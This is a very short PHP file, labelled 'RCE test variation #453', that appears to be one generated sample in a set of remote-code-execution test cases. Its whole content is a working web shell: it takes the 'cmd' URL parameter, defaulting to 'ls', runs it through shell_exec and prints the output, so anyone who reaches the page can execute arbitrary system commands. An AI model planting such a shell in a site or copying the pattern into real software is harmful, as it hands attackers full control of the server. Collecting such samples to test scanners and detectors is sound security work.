<?php
// RCE test variation #453
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>